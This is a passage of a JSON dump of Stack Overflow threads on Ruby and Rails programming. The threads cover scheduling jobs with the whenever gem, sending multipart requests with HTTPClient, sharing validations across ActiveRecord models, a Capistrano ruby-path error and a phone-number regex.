"https://www.gravatar.com/avatar/8508fe8290a73a85666ae96e64165526?s=128&d=identicon&r=PG&f=1", "display_name": "js_beginner", "link": "https://stackoverflow.com/users/8592732/js-beginner"}, "reply_to_user": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "edited": false, "score": 0, "creation_date": 1558338222, "post_id": 56215904, "comment_id": 99053267, "body": "@bo-oz I am using hatchbox.."}, {"owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "edited": false, "score": 0, "creation_date": 1558338379, "post_id": 56215904, "comment_id": 99053356, "body": "Sorry, not familiair with that solution, did find this, but it isn&#39;t helpful at all! <a href=\"https://hatchbox.gitbook.io/hatchbox/apps/cron-jobs\" rel=\"nofollow noreferrer\">hatchbox.gitbook.io/hatchbox/apps/cron-jobs</a>. Maybe ask their helpdesk?"}, {"owner": {"reputation": 85, "user_id": 8592732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8508fe8290a73a85666ae96e64165526?s=128&d=identicon&r=PG&f=1", "display_name": "js_beginner", "link": "https://stackoverflow.com/users/8592732/js-beginner"}, "reply_to_user": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "edited": false, "score": 0, "creation_date": 1558338569, "post_id": 56215904, "comment_id": 99053450, "body": "@bo-oz thanks for your help. I found where to put command, which sasys <code>Bash Script</code> and I added what @Vishal mentioned <code>whenever --update-crontab</code> and when I ran the script, it returns <code>.hatch&#47;action-164052.sh: line 1: whenever: command not found</code>."}, {"owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "edited": false, "score": 0, "creation_date": 1558350626, "post_id": 56215904, "comment_id": 99059875, "body": "I&#39;d try to run <code>bundle exec whenever --update-crontab</code> instead... otherwise, please contact support of Hatchbox, as it seems platform specific."}], "answers": [{"tags": [], "owner": {"reputation": 579, "user_id": 4251975, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5e702c6ee92d30ba83aea6f0b064a084?s=128&d=identicon&r=PG", "display_name": "Yurii", "link": "https://stackoverflow.com/users/4251975/yurii"}, "is_accepted": false, "score": 1, "last_activity_date": 1558337429, "creation_date": 1558337429, "answer_id": 56216169, "question_id": 56215904, "link": "https://stackoverflow.com/questions/56215904/how-to-use-whenever-gem-properly/56216169#56216169", "title": "how to use Whenever gem properly", "body": "<p>I'm assuming that you're using rails, so \u2014 files placed in lib/tasks are loaded as custom rake tasks by default, you can check it <a href=\"https://guides.rubyonrails.org/command_line.html#custom-rake-tasks\" rel=\"nofollow noreferrer\">here</a>.</p>\n\n<p>Brief instruction:</p>\n\n<ul>\n<li>Run <code>rails generate task posts create_post</code></li>\n<li>Modify <code>lib/tasks/posts.rake</code> </li>\n<li>Update <code>config/schedule.rb</code> from\n<code>runner \"Post.new_post\"</code> to <code>rake 'posts:create_post'</code></li>\n<li>Run <code>whenever --update-crontab</code> somehow on the server ;)</li>\n</ul>\n"}], "owner": {"reputation": 85, "user_id": 8592732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8508fe8290a73a85666ae96e64165526?s=128&d=identicon&r=PG&f=1", "display_name": "js_beginner", "link": "https://stackoverflow.com/users/8592732/js-beginner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1558337429, "creation_date": 1558336218, "question_id": 56215904, "link": "https://stackoverflow.com/questions/56215904/how-to-use-whenever-gem-properly", "title": "how to use Whenever gem properly", "body": "<p>I am just trying to create a record every 5 minutes using <code>whenever gem</code> but it doesn't create anything on the production.</p>\n\n<p><strong>config/schedule.rb</strong></p>\n\n<pre><code>every 5.minutes do \n runner \"Post.new_post\"\nend\n</code></pre>\n\n<p><strong>lib/tasks/post.rb</strong></p>\n\n<pre><code>class Post\n  def new_post\n    Post.create(title: \"cron testing\")\n  end\nend\n</code></pre>\n\n<p>and I ran <code>whenever</code> command then pushed to the live server but It doesn't create any records on the production.</p>\n\n<p>Which steps did I miss?</p>\n"}, {"tags": ["ruby", "multipartform-data"], "answers": [{"comments": [{"owner": {"reputation": 1147, "user_id": 3453125, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e12b058f9fbdbfbd73043f48c77de023?s=128&d=identicon&r=PG", "display_name": "Max Langerak", "link": "https://stackoverflow.com/users/3453125/max-langerak"}, "edited": false, "score": 0, "creation_date": 1558362110, "post_id": 56222001, "comment_id": 99066344, "body": "This seems to indeed have fixed this error, thank you."}], "tags": [], "owner": {"reputation": 166, "user_id": 1180351, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pKB8y.png?s=128&g=1", "display_name": "Rob Spoor", "link": "https://stackoverflow.com/users/1180351/rob-spoor"}, "is_accepted": true, "score": 1, "last_activity_date": 1558360397, "last_edit_date": 1558360397, "creation_date": 1558358977, "answer_id": 56222001, "question_id": 56215868, "link": "https://stackoverflow.com/questions/56215868/how-to-send-a-multipart-streaming-request-using-httpclient-in-ruby/56222001#56222001", "title": "How to send a multipart streaming request using httpclient in ruby", "body": "<p>Regarding your first issue, it appears that the documentation is not correct. I've performed some tests, and the content type appears to be application/x-www-form-urlencoded. You need to set the content type explicitly:</p>\n\n<pre><code>body: body, header: {'Content-Type': 'multipart/form-data; boundary=ABC'}\n</code></pre>\n\n<p>That's not sufficient though. You also need to set the content disposition manually. For instance:</p>\n\n<pre><code>      body = [{ 'Content-Type' =&gt; 'application/atom+xml; charset=UTF-8',\n                'Content-Disposition' =&gt; 'form-data; name=\"name1\"',\n                :content =&gt; '&lt;entry&gt;...&lt;/entry&gt;' },\n              { 'Content-Type' =&gt; 'video/mp4',\n                'Content-Disposition' =&gt; 'form-data; name=\"file\"; filename=\"myfile.pdf\"',\n                'Content-Transfer-Encoding' =&gt; 'binary',\n                :content =&gt; file }]\n</code></pre>\n\n<p>With this, httpbin reports one file and one form parameter.</p>\n\n<p>Your second issue is related to the same. Both your files and values need to have the content disposition set. For instance (quick and dirty, style can probably be better):</p>\n\n<pre><code>files.each do |k, v|\n    request_body &lt;&lt; { 'Content-Type' =&gt; v.content_type, :content =&gt; v.content, 'Content-Disposition' =&gt; 'form-data; name=\"' + k + '\"; filename=\"' + v.filename + '\"' }\nend\nvalues.each { |k, v| request_body &lt;&lt; { :content =&gt; v, 'Content-Disposition' =&gt; 'form-data; name=\"' + k + '\"' }}\n</code></pre>\n\n<p>Note that you should escape any \" in a name or filename.</p>\n"}], "owner": {"reputation": 1147, "user_id": 3453125, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e12b058f9fbdbfbd73043f48c77de023?s=128&d=identicon&r=PG", "display_name": "Max Langerak", "link": "https://stackoverflow.com/users/3453125/max-langerak"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 284, "favorite_count": 1, "accepted_answer_id": 56222001, "answer_count": 1, "score": 3, "last_activity_date": 1558360397, "creation_date": 1558336069, "question_id": 56215868, "link": "https://stackoverflow.com/questions/56215868/how-to-send-a-multipart-streaming-request-using-httpclient-in-ruby", "title": "How to send a multipart streaming request using httpclient in ruby", "body": "<p>I'm trying to get a multipart streaming post working with HTTPClient for Ruby. Upon which I encounter two problems.</p>\n\n<p><strong>Problem 1</strong>:\nFirst, if I try to do a normal post via the way described in the docs; and I return it via httpbin.org\nI see this happening:</p>\n\n<p><strong>Code</strong></p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>        File.open(path_to_my_file) do |file|\n          body = [{ 'Content-Type' =&gt; 'application/atom+xml; charset=UTF-8',\n                    :content =&gt; '&lt;entry&gt;...&lt;/entry&gt;' },\n                  { 'Content-Type' =&gt; 'video/mp4',\n                    'Content-Transfer-Encoding' =&gt; 'binary',\n                    :content =&gt; file }]\n          res = @http_client.post('http://httpbin.org/post', body: body)\n          response = res\n          puts res.body\n</code></pre>\n\n<p><strong>Result</strong></p>\n\n<pre><code>{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"{\\\"Content-Type\\\"=&gt;\\\"application/atom+xml; charset=UTF-8\\\", :content=&gt;\\\"&lt;entry&gt;...&lt;/entry&gt;\\\"}\": \"\", \n    \"{\\\"Content-Type\\\"=&gt;\\\"video/mp4\\\", \\\"Content-Transfer-Encoding\\\"=&gt;\\\"binary\\\", :content=&gt;#&lt;File:{{path_to_file}}&gt;}\": \"\"\n  }, \n  \"headers\": {\n    \"Accept\": \"*/*\", \n    \"Content-Length\": \"322\", \n    \"Content-Type\": \"application/x-www-form-urlencoded\", \n    \"Date\": \"Mon, 20 May 2019 06:43:17 GMT\", \n    \"Host\": \"httpbin.org\", \n    \"User-Agent\": \"HTTPClient/1.0 (2.8.3, ruby 2.6.0 (2018-12-25))\"\n  }, \n  \"json\": null, \n  \"origin\": \"IP, IP\", \n  \"url\": \"https://httpbin.org/post\"\n}\n</code></pre>\n\n<p>As you can see, I cannot see the content of the file, but only the identifier containing the URI to the File; and as such, I don't know how to fix it so that I can see and return the content. As far as I know it looks like it tries to see the File object as a String, which is of course not what I'd like it doing.</p>\n\n<p><strong>Problem2:</strong>\nWhenever I create the body dynamically, that is; creating the hash-array dynamically with objects set in my code, and I try to send it asynchronously (which I believe is the correct way of getting it streaming in HTTPClient for Ruby, although I'm not entirely sure)\nit sends the entire body as data, and no longer as either a form or headers.</p>\n\n<p><strong>code</strong></p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>        request_body = []\n        body.files.each do |k, v|\n          request_body.push( { 'Content-Type' =&gt; v.content_type, :content =&gt; v.content })\n        end\n        body.values.each { |k, v| request_body &lt;&lt; { k.to_sym =&gt; v }}\n\n        #This creates the array correctly, although I just wanted to show how it was generated\n\n        connection = @http_client.send(method + '_async', uri, body: request_body, header: headers)\n\n        response = connection.pop\n        # Starts reading result here\n</code></pre>\n\n<p><strong>Response</strong></p>\n\n<pre><code>  \"args\": {}, \n  \"data\": \"%7B%22Content-Type%22%3D%3E%22video%2Fmp4%22%2C+%3Acontent%3D%3E%23%3CFile%3A%2Fhome%2Fuser%2Ffiles%2file.mp4%3E%7D=&amp;%7B%3Avalue%3D%3E%22hello+world%22%7D=\", \n  \"files\": {}, \n  \"form\": {}, \n  \"headers\": {\n    \"Accept\": \"*/*\", \n    \"Content-Length\": \"247\", \n    \"Content-Type\": \"application/json\", \n    \"Date\": \"Mon, 20 May 2019 06:44:11 GMT\", \n    \"Host\": \"httpbin.org\", \n    \"User-Agent\": \"HTTPClient/1.0 (2.8.3, ruby 2.6.0 (2018-12-25))\", \n    \"ApplicationIdentifier\": \"identifier\"\n  }, \n  \"json\": null, \n  \"origin\": \"IP, IP\", \n  \"url\": \"https://httpbin.org/post\"\n}\n</code></pre>\n\n<p>As you can see, it puts everything in data, and I honestly don't know how to get it to send the post with the body as a form instead of as data. I send the file here as a File object.\nI have tried sending it as a normal post instead of post_async, but it does not seem to be working.</p>\n\n<p>Has anyone encountered these problems before and know how I should go about fixing these? (or can you see where I went wrong so that I can at least try getting a bit further)</p>\n\n<p>Thanks in advance</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 4, "creation_date": 1558334436, "post_id": 56215038, "comment_id": 99051658, "body": "If you want to re-use the same code (validations) in both models why don&#39;t you just use a mixin or concern? Regarding multi-table inheritance, I would argue that Ruby on Rails prefers single table inheritance and fighting against Rails conventions is almost never a good idea. A <code>type</code> column has a very special meaning when working with classes inherit from another ActiveRecord class. That might be the reason for our issues."}, {"owner": {"reputation": 117, "user_id": 11393228, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NSyzDJLYh-0/AAAAAAAAAAI/AAAAAAAAALo/qmC7Ta_ZRAo/photo.jpg?sz=128", "display_name": "aplneto", "link": "https://stackoverflow.com/users/11393228/aplneto"}, "reply_to_user": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1558365080, "post_id": 56215038, "comment_id": 99068115, "body": "In the case you showed me in the link, I would put the module in the <code>concern</code> folder, right?"}], "answers": [{"tags": [], "owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "is_accepted": false, "score": 2, "last_activity_date": 1558332515, "creation_date": 1558332515, "answer_id": 56215150, "question_id": 56215038, "link": "https://stackoverflow.com/questions/56215038/what-is-the-most-dry-way-to-implement-multiple-table-inheritance-in-rails/56215150#56215150", "title": "What is the most dry way to implement multiple table inheritance in rails?", "body": "<p>If you are using a separate table, you should not be using a different model as subclass. In this case you just want to inherit from <code>ActiveRecord::Base</code>. If you want to share the validations, you could put them in a module and require it in both models.</p>\n\n<p>Of course you could also move to real STI, but in that case you would need to add a <code>type</code> column to the single table. In that case you are able to inherit from <code>Hospital</code>, but it would be even better to inherit from <code>Institute</code> and let <code>Hospital</code> also inherit from that Base class.</p>\n\n<pre><code>class Institute &lt; ActiveRecord::Base\n  # put your validations here\nend\n\nclass Hospital &lt; Institute\nend\n\nclass Pharmacy &lt; Institute \nend\n</code></pre>\n\n<p>Edit: if you like to use MTI... see this answer for how to set-up validation Mixins: <a href=\"https://stackoverflow.com/a/11372578/891359\">https://stackoverflow.com/a/11372578/891359</a></p>\n"}, {"tags": [], "owner": {"reputation": 13359, "user_id": 1779477, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/f62e1d28063f41fd9728d811fea3a84c?s=128&d=identicon&r=PG&f=1", "display_name": "idmean", "link": "https://stackoverflow.com/users/1779477/idmean"}, "is_accepted": true, "score": 2, "last_activity_date": 1558335181, "creation_date": 1558335181, "answer_id": 56215655, "question_id": 56215038, "link": "https://stackoverflow.com/questions/56215038/what-is-the-most-dry-way-to-implement-multiple-table-inheritance-in-rails/56215655#56215655", "title": "What is the most dry way to implement multiple table inheritance in rails?", "body": "<p>What you need is an abstract class:</p>\n\n<pre><code>class Hospital &lt; ActiveRecord::Base\n  self.abstract_class = true\n\n  # validations...\nend\n</code></pre>\n\n<p>Then remove the table names from your subclasses.</p>\n"}], "owner": {"reputation": 117, "user_id": 11393228, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NSyzDJLYh-0/AAAAAAAAAAI/AAAAAAAAALo/qmC7Ta_ZRAo/photo.jpg?sz=128", "display_name": "aplneto", "link": "https://stackoverflow.com/users/11393228/aplneto"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1320, "favorite_count": 0, "accepted_answer_id": 56215655, "answer_count": 2, "score": 2, "last_activity_date": 1558335181, "creation_date": 1558331786, "question_id": 56215038, "link": "https://stackoverflow.com/questions/56215038/what-is-the-most-dry-way-to-implement-multiple-table-inheritance-in-rails", "title": "What is the most dry way to implement multiple table inheritance in rails?", "body": "<p>I have a few tables in my application that share most columns, I wrote all the validations in one model and tried to make all the other models inherit from this one but got an <code>ActiveRecord::SublassNotFound</code> error.</p>\n\n<p>This are the codes for my models:</p>\n\n<h3><code>hospial.rb</code></h3>\n\n<pre class=\"lang-rb prettyprint-override\"><code>class Hospital &lt; ActiveRecord::Base\n\n    validates :cnes, presence: true, numericality: true\n    validates :name, presence: true, length: { maximum: 80 }\n    validates :address, presence: true, length: { maximum: 50 }\n    validates :neighborhood, presence: true, length: { maximum: 30 }\n    validates :phone, presence: true, length: { in: 10..25 }\n    validates :latitude, :longitude, presence: true, length: { maximum: 20 }\n    validates :type, presence: true\n</code></pre>\n\n<h3><code>pharmacy.rb</code></h3>\n\n<pre class=\"lang-rb prettyprint-override\"><code>class Pharmacy &lt; Hospital\n   self.table_name = 'pharmacies' \nend\n</code></pre>\n\n<p>Both tables have the exact same columns and I choose to use MTI to give my database more scalability, since both the pharmacy and the hospital will also have STI to multiple models.</p>\n\n<p>This is the error I'm getting:</p>\n\n<pre><code>ActiveRecord::SubclassNotFound:\n       Invalid single-table inheritance type: Hospital is not a subclass of Pharmacy\n</code></pre>\n\n<p>I would like to reuse the validations and some methods I intend to implement for both models.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "bundle", "capistrano"], "answers": [{"tags": [], "owner": {"reputation": 6001, "user_id": 451544, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/y1dRE.jpg?s=128&g=1", "display_name": "Snips", "link": "https://stackoverflow.com/users/451544/snips"}, "is_accepted": true, "score": 1, "last_activity_date": 1558716019, "creation_date": 1558716019, "answer_id": 56296557, "question_id": 56214943, "link": "https://stackoverflow.com/questions/56214943/invalid-ruby-path-bin-ruby-during-capistrano-bundle-install/56296557#56296557", "title": "Invalid Ruby path &#39;//bin/ruby&#39; during Capistrano Bundle install", "body": "<p>OK, I figured out what was going on.</p>\n\n<p>After 34 years of using Unix, I learned that '//' is valid syntax for a path, so that was a red herring.</p>\n\n<p>The issue really was that ruby executable wasn't in //usr/bin</p>\n\n<p>I experimented with linking from the actual path that ruby was located, but this just hit other issues with ruby versions (that old chestnut).</p>\n\n<p>The eventual 'fix' was to start again with a fresh Ubuntu instance, and install ruby using</p>\n\n<pre><code>sudo apt install ruby-full\n</code></pre>\n\n<p>...rather than...</p>\n\n<pre><code>sudo snap install ruby --classic --channel=2.3/stable\n</code></pre>\n\n<p>...that I had used previously.</p>\n\n<p>Using the apt install put ruby under /usr/bin, and all was right with the world again.</p>\n\n<p>Thanks.</p>\n"}], "owner": {"reputation": 6001, "user_id": 451544, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/y1dRE.jpg?s=128&g=1", "display_name": "Snips", "link": "https://stackoverflow.com/users/451544/snips"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 124, "favorite_count": 0, "accepted_answer_id": 56296557, "answer_count": 1, "score": 0, "last_activity_date": 1558716019, "creation_date": 1558331299, "last_edit_date": 1558344345, "question_id": 56214943, "link": "https://stackoverflow.com/questions/56214943/invalid-ruby-path-bin-ruby-during-capistrano-bundle-install", "title": "Invalid Ruby path &#39;//bin/ruby&#39; during Capistrano Bundle install", "body": "<p>I have a long standing Rails app that runs on Ubuntu on another cloud service, but I'm migrating it to AWS.</p>\n\n<p>The Capistrano 3 deployment gets so far, but it fails installing gems that require native building, with the following error (this is one example).</p>\n\n<p>I've pasted the full error at the bottom, but the root cause error appears to be the path used to invoke ruby,</p>\n\n<pre><code>sh: 1: //bin/ruby: not found\n</code></pre>\n\n<p>The same gem[s] install fine when installed locally on the AWS server.</p>\n\n<p>I've investigated, and confirmed that the deployment via ssh is using a non-interactive shell, but I'm setting the ruby path using all three of .bashrc, /etc/environment and using,</p>\n\n<pre><code>set :default_env, { \"PATH\" =&gt; \"$PATH:/snap/bin\" }\n</code></pre>\n\n<p>...but still no joy.</p>\n\n<p>I suspect there's a problem with the way the path to invoke ruby is being formed, as //bin/ruby (with that double forward slash) is syntactically incorrect for bash shell.</p>\n\n<p>It's as if there's an environment variable that should be set and inserted between those slashes is defined as an empty string (or just not defined), but I've checked env vars for non-interactive shell against the interactive shell, and all looks the same in interactive and non-interactive shells.</p>\n\n<p>I'm not using rvm, as I don't need to, and would rather not add that complexity unless it's absolutely needed (and I don't think it should be).</p>\n\n<p>Any ideas on why ruby is being invoked with that invalid path?</p>\n\n<hr>\n\n<p>Full error details, for context and reference,</p>\n\n<pre><code>An error occurred while installing mysql2 (0.3.21), and Bundler cannot continue.\nMake sure that `gem install mysql2 -v '0.3.21' --source 'https://rubygems.org/'`\nsucceeds before bundling.\n\nIn Gemfile:\n  mysql2\n\n\nGem::Ext::BuildError: ERROR: Failed to build gem native extension.\n\ncurrent directory:\n/home/rails/myrailsapp/deployonaws/shared/bundle/ruby/2.3.0/gems/therubyracer-0.12.3/ext/v8\n//bin/ruby -r ./siteconf20190520-13147-dgcr4x.rb extconf.rb\nsh: 1: //bin/ruby: not found\n\nextconf failed, exit code 127\n</code></pre>\n"}, {"tags": ["regex", "ruby", "regex-lookarounds", "regex-group", "regex-greedy"], "comments": [{"owner": {"reputation": 381813, "user_id": 1863229, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/4sh1l.png?s=128&g=1", "display_name": "Tim Biegeleisen", "link": "https://stackoverflow.com/users/1863229/tim-biegeleisen"}, "edited": false, "score": 0, "creation_date": 1558326921, "post_id": 56214299, "comment_id": 99049513, "body": "Can you include some examples where the phone number contains parentheses?"}, {"owner": {"reputation": 2960, "user_id": 8089674, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/29551894f595eb07cf3e8d4c27b36626?s=128&d=identicon&r=PG&f=1", "display_name": "Robo Mop", "link": "https://stackoverflow.com/users/8089674/robo-mop"}, "edited": false, "score": 0, "creation_date": 1558327286, "post_id": 56214299, "comment_id": 99049598, "body": "When you say 9 digits, do you mean 4 digits, dash, then 4 digits?"}, {"owner": {"reputation": 117, "user_id": 11393228, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NSyzDJLYh-0/AAAAAAAAAAI/AAAAAAAAALo/qmC7Ta_ZRAo/photo.jpg?sz=128", "display_name": "aplneto", "link": "https://stackoverflow.com/users/11393228/aplneto"}, "edited": false, "score": 0, "creation_date": 1558327542, "post_id": 56214299, "comment_id": 99049657, "body": "Just added the examples."}, {"owner": {"reputation": 117, "user_id": 11393228, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NSyzDJLYh-0/AAAAAAAAAAI/AAAAAAAAALo/qmC7Ta_ZRAo/photo.jpg?sz=128", "display_name": "aplneto", "link": "https://stackoverflow.com/users/11393228/aplneto"}, "edited": false, "score": 0, "creation_date": 1558327584, "post_id": 56214299, "comment_id": 99049666, "body": "It may be 4 digits, dash and then 4 digits, but it also could be 5 digits, dash and the 4 digits."}, {"owner": {"reputation": 2960, "user_id": 8089674, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/29551894f595eb07cf3e8d4c27b36626?s=128&d=identicon&r=PG&f=1", "display_name": "Robo Mop", "link": "https://stackoverflow.com/users/8089674/robo-mop"}, "edited": false, "score": 0, "creation_date": 1558327814, "post_id": 56214299, "comment_id": 99049722, "body": "I&#39;ve posted an answer which takes care of the parentheses problem, feel free to check it out"}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1558336226, "post_id": 56214299, "comment_id": 99052383, "body": "Have you considered combine multiple simple patterns via <code>|</code> rather than having one very complex one?"}], "answers": [{"comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 1, "creation_date": 1558327356, "post_id": 56214378, "comment_id": 99049612, "body": "Leading <code>[0-9]{2,3}</code> would match <code>999</code> which must be ruled out according to OP."}, {"owner": {"reputation": 117, "user_id": 11393228, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NSyzDJLYh-0/AAAAAAAAAAI/AAAAAAAAALo/qmC7Ta_ZRAo/photo.jpg?sz=128", "display_name": "aplneto", "link": "https://stackoverflow.com/users/11393228/aplneto"}, "edited": false, "score": 1, "creation_date": 1558327674, "post_id": 56214378, "comment_id": 99049688, "body": "Yes, but if I put <code>0?\\d{2}</code> it should do it, right?"}, {"owner": {"reputation": 117, "user_id": 11393228, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NSyzDJLYh-0/AAAAAAAAAAI/AAAAAAAAALo/qmC7Ta_ZRAo/photo.jpg?sz=128", "display_name": "aplneto", "link": "https://stackoverflow.com/users/11393228/aplneto"}, "edited": false, "score": 1, "creation_date": 1558327708, "post_id": 56214378, "comment_id": 99049700, "body": "I just added more examples using parenthesis"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1558327758, "post_id": 56214378, "comment_id": 99049708, "body": "No, the question has not been changed. Examples were added, but the statement itself stays as it was."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 117, "user_id": 11393228, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NSyzDJLYh-0/AAAAAAAAAAI/AAAAAAAAALo/qmC7Ta_ZRAo/photo.jpg?sz=128", "display_name": "aplneto", "link": "https://stackoverflow.com/users/11393228/aplneto"}, "edited": false, "score": 0, "creation_date": 1558327818, "post_id": 56214378, "comment_id": 99049723, "body": "@aplneto should do exactly what? This is not any better than your original approach and it has nothing to do with the real question about parentheses."}, {"owner": {"reputation": 117, "user_id": 11393228, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NSyzDJLYh-0/AAAAAAAAAAI/AAAAAAAAALo/qmC7Ta_ZRAo/photo.jpg?sz=128", "display_name": "aplneto", "link": "https://stackoverflow.com/users/11393228/aplneto"}, "edited": false, "score": 1, "creation_date": 1558328227, "post_id": 56214378, "comment_id": 99049830, "body": "Hi @Emma, it&#39;s almos this but it can&#39;t match a string with just open or closing parenthesis like <code>(00 0000-0000</code>. Also the area code must be an optional &#39;0&#39; followed by two digits."}, {"owner": {"reputation": 117, "user_id": 11393228, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NSyzDJLYh-0/AAAAAAAAAAI/AAAAAAAAALo/qmC7Ta_ZRAo/photo.jpg?sz=128", "display_name": "aplneto", "link": "https://stackoverflow.com/users/11393228/aplneto"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1558328307, "post_id": 56214378, "comment_id": 99049844, "body": "@AlekseiMatiushkin, I was talking about the area code format. That this <code>0?\\d{2}</code> should match the format I explained right?"}, {"owner": {"reputation": 117, "user_id": 11393228, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-NSyzDJLYh-0/AAAAAAAAAAI/AAAAAAAAALo/qmC7Ta_ZRAo/photo.jpg?sz=128", "display_name": "aplneto", "link": "https://stackoverflow.com/users/11393228/aplneto"}, "edited": false, "score": 1, "creation_date": 1558328811, "post_id": 56214378, "comment_id": 99049954, "body": "@Emma It is, but this format should not be valid. What I want to validade in the expression is if there is an opening parenthesis before the area code, there should also be a closing one. Like <code>(0000000000</code> should not be valid, but <code>0000000000</code> and <code>(00)000000000</code> should."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558336282, "post_id": 56214378, "comment_id": 99052410, "body": "<code>&#39;(000) 000000000&#39;.match? re #=&gt; false</code> and <code>&#39;(000 000000000&#39;.match? re #=&gt; true</code>. Unfortunately, both are incorrect."}], "tags": [], "owner": {"reputation": 1, "user_id": 6553328, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/omcAX.jpg?s=128&g=1", "display_name": "Emma", "link": "https://stackoverflow.com/users/6553328/emma"}, "is_accepted": false, "score": 2, "last_activity_date": 1558328086, "last_edit_date": 1558328086, "creation_date": 1558327001, "answer_id": 56214378, "question_id": 56214299, "link": "https://stackoverflow.com/questions/56214299/regex-for-matching-specific-phone-numbers/56214378#56214378", "title": "RegEx for matching specific phone numbers", "body": "<p>There might be several ways to validate these numbers. One way would be that, we write all our possible phone numbers, then write an expression for it. Maybe, similar to: 